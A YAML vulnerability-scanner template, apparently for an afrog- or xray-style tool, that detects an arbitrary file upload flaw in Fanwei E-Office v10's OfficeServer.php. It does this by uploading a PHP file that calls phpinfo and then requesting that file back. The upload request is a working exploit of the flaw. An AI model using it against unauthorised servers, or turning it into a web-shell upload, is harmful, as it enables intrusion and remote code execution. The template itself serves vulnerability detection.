expression: r0() && r1()
id: e-office-v10-officeserver-upload
info:
  author: zan8in
  descripiton: "\u6CDB\u5FAEOA E-Office OfficeServer.php \u5B58\u5728\u4EFB\u610F\u6587\
    \u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\
    \u53EF\u4EE5\u83B7\u53D6\u5230\u670D\u52A1\u5668\u654F\u611F\u4FE1\u606F\n\"eoffice10\"\
    \n"
  name: "\u6CDB\u5FAEOA E-Office OfficeServer.php \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\
    \u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20OfficeServer.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200
    request:
      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;name=\"\
        FileData\";filename=\"{{randstr}}.php\"\r\nContent-Type: application/octet-stream\r\
        \n\r\n<?php phpinfo();?>\r\n\r\n------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data;name=\"FormData\"\r\n\r\n{'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{randstr}}.php'}\r\
        \n------WebKitFormBoundary{{rboundary}}--"
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      method: POST
      path: /eoffice10/server/public/iWebOffice2015/OfficeServer.php
  r1:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /eoffice10/server/public/iWebOffice2015/Document/{{randstr}}.php
set:
  randstr: randomLowercase(12)
  rboundary: randomLowercase(8)
